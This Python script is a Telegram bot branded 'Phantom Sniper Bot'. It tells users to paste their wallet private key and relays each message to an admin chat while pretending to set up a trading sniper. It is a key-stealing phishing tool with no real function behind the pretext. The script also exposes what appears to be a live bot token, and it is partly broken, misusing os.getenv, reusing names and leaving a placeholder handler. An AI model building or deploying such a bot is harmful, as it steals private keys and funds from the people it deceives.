import os
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv("8077438311:AAHSMggXsTuduBg21hewc9USrVMojFrVNS4")
ADMIN_CHAT_ID = os.getenv("6197379820")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome to Phantom Sniper Bot!\nPaste your private key below to start.")

async def handle_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key = update.message.text
    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"🔐 Key Received: {key}")
    await update.message.reply_text("✅ Received. Setting up sniper...")

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key))

# Inside bot.py
from flask import Flask
from threading import Thread

# Flask app for uptime
app = Flask('')
@app.route('/')
def home():
    return "I'm alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# 👇 Make sure this is ABOVE run_polling()
keep_alive()

# Your existing bot logic continues here...
app_telegram = ApplicationBuilder().token(BOT_TOKEN).build()
app_telegram.add_handler(...)  # etc.
app_telegram.run_polling()
